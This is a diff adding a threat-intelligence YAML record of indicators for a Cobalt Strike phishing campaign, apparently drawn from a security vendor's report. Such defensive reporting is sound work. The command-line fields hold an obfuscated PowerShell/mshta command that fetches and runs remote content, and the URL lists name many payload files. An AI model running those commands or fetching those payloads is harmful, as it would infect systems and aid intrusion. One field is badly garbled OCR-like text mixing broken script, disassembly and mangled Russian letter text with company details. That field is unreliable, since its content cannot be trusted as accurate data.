@@ -1,0 +1,193 @@
+description: Operation FrostBeacon targets Russian B2B enterprises focusing on finance
+  and legal departments using multi-layered infection chains involving phishing emails,
+  malicious LNK files, and CVE-2017 exploits.
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - mshta.exe
+  commandline:
+  - /c powershell -WindowStyle Hidden -Command m^s^h^t^a^ ^h^t^t^p^s^:^/^/^e^z^s^t^a^t^.^r^u^/^f^l^o^w^e^r^s^f^o^r^l^o^v^e^.^g^i^f
+  - mshta Sxe via PowerShell - itps /ezstat w/flowersforlove Gif
+  powershell:
+  - m^s^h^t^a^ ^h^t^t^p^s^:^/^/^e^z^s^t^a^t^.^r^u^/^f^l^o^w^e^r^s^f^o^r^l^o^v^e^.^g^i^f
+  - Sxe via PowerShell - itps /ezstat w/flowersforlove Gif
+  scripting_engine: []
+  registry_keys: []
+  image_load:
+  - kernel32.dll
+  - wininet.dll
+  network_connections:
+  - mshta.exe, hxxps://ezstat.ru/flowersforlove.gif, 8443
+  - powershell.exe, hxxp://update.ecols.ru/jquery-3.3.1.slim.min.js, 8443
+  - update.ecols[.]ru:8443
+  - 45.147.14.106:62900
+  file_activity:
+  - .zip.lnk
+  - .pdf.lnk
+  - dosing.hta
+  - 'C:\\Windows\\System32\\WindowsPowerShellv1.|crts g(s52t TN - crsnmpuc e )saoeitao
+    - &Finction s gesgroc saress {ot Giar_bosie, S acksure)APttt o e metncs < ({ippDomsin]CrrentOomin.
+    ethsseplies() | Mnere-0oect (5. GlonslsemnlyCacne i 3Siar i S eiute note Seerosr
+    ebrathos ceohroccar e (roell] B oyt it nterostr fets sdienetR S e s TS, BCLSstem
+    Runaa- nterosarstco. Frdlene e 6o 575t Munkbn. ke assevices o)cton e g e e \"
+    Trareeter(posteton = o, tanantary = $Tro0] [1y0el) Suor rsmeers,| i 3 e B o e
+    elSuartyoe_puttoe  [ipc0omsinl CrrentOomn. efinedmumichssaply (- Cofect System
+    et Asemmise( elSiar e ke DefinecomteuctorC ASoecis ey TLEySLE, PELLC  [ystem deiection
+    Cotingconartion]: stunseR o A St e R T b R e| Feen s st cratrc)[3ree1su_cos  [5ystn.Comre]Fromsasestsering(
+    S5ua 5 GETIHETa e E34FELLROBRL CELOP B3 TGS To0 501for (533 - 0 833 -3 3 come
+    Comes 55500or (832 = 9 $3z -1t Sv_code.Count; Szo488 8538889132lodsoxfebp,esp.edx,edxedx,DHORD
+    PTR fs: [edx+0x30]edx, DHORD PTR [edx+xc]edx, DHORD PTR [edx+ox1a]51, DHORD PTR
+    [edx+0x28]X, WORD PTR [edx0x26]edi,ediL, BYTE PTR ds:[esi]1,061o7aL,0x20edi, oxdedi,eaxoxteedxediedx,
+    DHORD PTR [edx+0x10]eax, DHORD PTR [eax+0x3c]eax,edxeax, DHORD PTR [eax+0x78]oxe9.eax,edxecx,
+    DHORD PTR [eax+0x18]b, DHORD PTR [eax+0x20]ebx,edx.oxes.51, DH0RD PTR [ebxrecx4]esiedxediedia1,
+    BYTE PIR ds:QmKarnatoohaus vyphishing attachmentB downloads (chaining CVES) pexaasamns
+    docx Mperesuedocx wamplpeGomne 19,03 docx wagere logstantonoe docx A0 eveaonrnesa)[oVE2017.0196]
+    ._ tps /ezstat u/ixtixixt0)  @gl Sopetomplect fComelechiea PS loads Shelicode.
+    Eonelttia@ somorion (@)monnson rmeN- @45.14591.16464830 Cobaltstrike BeaconRocync6uan
+    nperenaun) Kopwa iarseea NITo: O rentalcar Fi2025.03-140518A reereiouadoc oLBt
+    Acityeaxaewtie KonnerHanpasAem AOCYASGHYI0 NpeTeHMIo. ObpatLaemBHUMaNVETO B Ciyae
+    OTCYTCTBWA NAATEXa B CPOK A0 14.03.25,\"Halla KOMRaHWA GyACT O6pAILATLCA B APGHTPaXIHI
+    CYA Xa5POBKOTO Kpas C UCKOBM3a5BEHAEM AR PHHYAMTETLHOTO BIHCKBHWS SAOTXEHHOCTH(BK7I0A
+    NeHw M MPOLIENTS 10 2070BOPY) POCUM NPHHATS K CBEASHHIO,COrRACHO TyHKTY8010803
+    21,361 1.1-144 paduka naaTexek,AATO aKIIENTUPOBAHIA NAaTEXa CUMTAETCA GaKTMHECKaR
+    AaTa SauCREHvA(aKLE)~AEHEXMbiX Ha GIHKOBCKHH CUT,yXaSaHHLA B JOTOBOPe.Taioxe MPOCHM
+    HaNPABHTS B Hall JADEC NOATHCAHHYIO W ABEDENHHYIO CKaHKOMMIO IKTaCBepKY PACUETOB,
+    ORHOMOMENTHO Hanpaswe.OpUTUIaN O Hallewy opHAISCKOMY 3APecy.TI0 MOGHM BONPOCAM
+    CEATAMHHM ~AOCYAC6HBIM YPeryMpOBaHHeM IOXaRYCTa MMMTE.Tloxanyicra,CoXpaHAMTe HCTOPYIO
+    Nepenou.CackGo.Cysaxenmen,Vnaroesa KopuaPYKOBOAMTER IpWINIECKOTO OTAEAaOwnwan
+    000 Tymays 6 rXabaposckTer. +742121332-550 206, 143Mob. 8925 196 00 72BocyaeGuan
+    nperensunKapwwia Vinareesa & 6 & ~ololaTo: noreply Fies 03140435A rpereomndoc
+    o106t R yaxaente Koner HanpaEEM AOCYACGRYI TPETENOM OBaLEM BHMIIAELTO bcayiae
+    oroyrows nrarexa b cpox A0 140325,otia KoMnaH GyAET OGpAULITLC b ADGHTPaXIHI CYA
+    KABAPOBKORD K  KB SanEREHAEMR TP RHOTD B30CKaR SAAORXEHOCTH(PXnouan et 1 pouenT
+    o OrO00pY)TPOCHM PHIT K CHEACHAICOTACHD YT AOKOROPS2136 11-144 patusa rarexes,7O
+    SKUETTYPORaIA AT COMTBETCR G3XTAECK3 19T 39HCACHHA(AKIENT) ACHEIN oGrconoonh cueryeasani
+    0 Aorosope.Taroxe oCHA KATPAHTS b Kol ADEC NOATHCIHINO H ABEPEHHYIO CKAHROTAO
+    3T COEPEHpacieronomsowouEHTHO HanpateAT 1o Hatiewy opKIECKoN aADECY 1o G BONOCaN
+    MM C AOYACSHMyperymposasesoxarycra eTIOXaryHCa COpaHAHTE HCTOPHO NEPETHCXH CRACHED[Vinareesa
+    KapuiaPYKOBOMTEN: 10DHAMIECKOTO OTAeAOwnman 000 <Tyntaya & rXa6aposcx.Ten. +7(4212)332-550
+    206, 143Mos. 8925 1960072info] Pexnamauun340 HIIO K3CT ANlTo: Ointo Tue 202405141548
+    peamawndoc ;HoGpi pesHanpasnsem nocyaeGyioIpeTeI310.06paUIBENM BNUMAHAE.ATO 8
+    CTyae OTCYTCTEHA MAATEX B CPOK A017.05.24,GyAem 0GpaUIATLCH B APGHTPXHA CYA KYPIaNa  KoBMARaRCHMEM
+    A1 TDHIYMTERHOND E3ICKaMAA SAAORXEHHOCTH (BXIOUS e MouENTH 10 20160 TPOGHAM NPHHATS
+    K CoeAEHMO COFTaCHD TYHETY20ro80pa 36,144 .-14.7 padyea nrarexesi Aaroft cemposaAAaTEXa
+    CHMTAETCA $aKTIAIECKaR AATa SaHMCHEHHA(BRLET) ACHEXHRX 1GaNKORCAU CHeT XM B AOTOBOpe.
+    TAOKE TPOCHM HANPIBHTS B HatARPeC NOAMCEHIIO W 330epeIYIO CRAMKOTNI KTa CBEPE[PACHETOR,
+    QAHOMOUENTHO HaIPIBHS OPWIIAA 1O HaLLEMY IODHIMIECKONY.APy 10 MoBoM BONPOCaM M
+    C AOCYACGHMJPeryMpOBaIHEM I0XaCTa uMTe. T1OXGTYFCTa COPRHATTE WCTOPHOnepenmoon
+    Cracu6o.C YaaxemenaMeCTATENs PYKOBOVTERS 1OPHNIECKDTO AenapramenTaaepuitoe Acusonepnoe
+    O6utectso O Kypramce 32808 CrewTexmmoPoros Arexcanap CepreesusVIHH 4501164494KN
+    450101001BAK 043735621OFPH 1114501000481B 000 Kb \"KETOBCKIII\"P/c40702810200000001301K/
+    3010181030000000082110p. aapec 640027, Poccus, . Kypran,yn. Mpowsuunesvas, 9,
+    Crpoese 4.@ anpec 640027, POCUS, . Kyprar, ya. KMarona, aow 125Tenegor: +7 (3522)
+    630-890; 7 (3522) 630-580Oaxc 47 (522) 630-879<hml versions\"1.0\" encoding=\"UTF-\"
+    stondalone-\"yes\" 7><Relationships xalnse\"hitp/schenss. cpemalforaas.org/package/
+    2006/ relationships>Relationship 14-\"rT61 Type--htip//chemas.opemenlformats.org/ofFiceDocument
+    /2006 el ioaships/tachedTemplate Tanget.0e63; 8074 8074 48170;88500; 8 U2 ST 805
+    RENTA N1 T ML SOCTLE758820 72 061 870,505, M kS 672 678,465, Tagetfode\"External)
+    ><Relationshipe><2xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><Relationships
+    xmlns=\"http://schenas.openxmlfornats.org/package/2006/ relationships\"><Relationship
+    Td=\"rId1\" Type=\"http://schenas. openxmlfornats.org/ofFiceDocument/2006/rTarget=\"http://vlasta-s.ru/logista.rtf\"
+    TargetHode=\"External\"/></Relationships>vRgy 33 s0  oop-smanserch E | L 0 O %-sw3a1138orseorse'
+  persistence: []
+  process_relations:
+  - cmd.exe->powershell.exe
+  - powershell.exe->mshta.exe
+IOCs:
+  hashes:
+  - 7096141a5b480e793e9a890b84ebaee2
+  - 16ae36df5bee92d8c4cae8e17583a2c9
+  - f87227dad7bedf66bf1a1b97aa36bf62
+  - f87227dad7bedf66bf1a1b97aa36bf622c18c78ec584c5d2d045c9ab94774ad73
+  - 95da66bee080c943e820b4e61e50de6315bcab1a9cbfe0b5b24676c2016a9cc4ac75939c482d5c30637d56a379835f1feae3d231a354882bb0f70889cc69a74
+  ip_addresses:
+  - 45.147.14.106
+  - 45.145.91.164
+  domains:
+  - ezstat.ru
+  - update.ecols.ru
+  - incident.zilab.ru
+  - mcnn.ru
+  - order.edrennikov.ru
+  - cba.abc92.ru
+  - forensics.jwork.ru
+  - hostbynet.ru
+  - moscable77.ru
+  - gk-stst.ru
+  - aquacomplect.ru
+  - ekostroy33.ru
+  - valisi[.]ru
+  - bsprofi[.]ru
+  - iplis[.]ru
+  - zetag[.]ru
+  - lieri[.]ru
+  - dosingpumps[.]ru
+  - esetnod64[.]ru
+  - yadro[.]ru
+  - iplogger[.]ru
+  - krona77[.]ru
+  - bti25[.]ru
+  - update.ecols[.]ru
+  - yip.su
+  - iplis.ru
+  - valisi.ru
+  - bsprofi.ru
+  - zetag.ru
+  - vlasta-s.ru
+  - ecols.ru
+  - bt25.ru
+  - emec.su
+  - gemme-cotti.ru
+  - ipgrabber.ru
+  - iplogger.ru
+  - ship-care.com
+  - krona77.ru
+  urls:
+  - hxxps://ezstat.ru/flowersforlove.gif
+  - hxxp://update.ecols.ru/jquery-3.3.1.slim.min.js
+  - hxxps://yip.su/txttxt.jpg
+  - hxxps://ezstat.ru/txttx.txt
+  - hxxps://iplis.ru/lovers.jpeg
+  - hxxps://iplis.ru/tramp.jpg
+  - hxxps://iplis.ru/laydowngrenade.jpeg
+  - hxxps://iplogger.cn/forensicsas.png
+  - hxxps://iplis.ru/penises.jpg
+  - hxxps://ezstat.ru/kissmyass.gif
+  - hxxps://ezstat.ru/camorra.gif
+  - hxxps://yip.su/ncikigovru.gif
+  - hxxp://valisi.ru/dosing.hta
+  - hxxp://canature.su/ya.hta
+  - hxxp://aquacomplect.ru/complex.hta
+  - hxxp://bsprofi.ru/min.hta
+  - hxxp://zetag.ru/z.hta
+  - hxxp://vlasta-s.ru/logista.hta
+  - hxxp://ecols.ru/ecols.hta
+  - hxxp://bsprofi.ru/profit.hta
+  - hxxp://dosingpumps.ru/nciki.hta
+  - hxxp://yip.su/certgovrufuck.gif
+  - hxxp://zetag.ru/siro.doc
+  - hxxp://zetag.ru/tramp.rtf
+  - hxxp://aquacomplect.ru/aqua.docx
+  - hxxp://clack.su/fox.docx
+  - hxxp://vlasta-s.ru/logista.rtf
+  - hxxp://valisi.ru/first.rtf
+  - hxxp://ecols.ru/gogo.rtf
+  - hxxp://bti25.ru/openai.rtf
+  - hxxp://bti25.ru/china.hta
+  - hxxp://gemme-cotti.ru/mida.hta
+  - hxxp://xn--e1ajbcejcefx.xn--p1ai/sflopytrgjklhfaseri
+  - hxxp://emec.su/bg.rtf
+  - hxxp://gemme-cotti.ru/cotti.docx
+  - hxxp://gemme-cotti.ru/zibaba.hta
+  - hxxps://ipgrabber.ru/penis.gif
+  - hxxps://iplogger.ru/sugar.pnghxxps://ship-care.com/care.rtf
+  - hxxp://krona77.ru/edr.hta
+  - hxxps://update.ecols.ru:8443/jquery-3.3.1.slim.min.jshxxps://incident.zilab.ru:8443/jquery-3.3.1.slim.min.jshxxps://mcnn.ru:8443/jquery-3.3.1.slim.min.jshxxp://poopy.aarkhipov.ru:8080/jquery-3.3.1.slim.min.jshxxps://ekostroy33.ru/jquery-3.3.2.min.jshxxp://order.edrennikov.ru/jquery-3.3.1.min.jshxxps://cba.abc92.ru:8443/jquery-3.3.1.slim.min.jshxxps://moscable77.ru:8443/jquery-3.3.1.slim.min.jshxxp://forensics.jwork.ru/jquery-3.3.1.slim.min.js
+authors:
+- Rayapati Lakshmi Prasanna Sai
+- Jyoti Karlekar
+- Sanjay Katkar
+reference: https://www.seqrite.com/blog/operation-frostbeacon-multi-cluster-cobalt-strike-campaign-targets-russia/
+date_of_publication: December 08, 2025
+file_creation_date: December 09, 2025
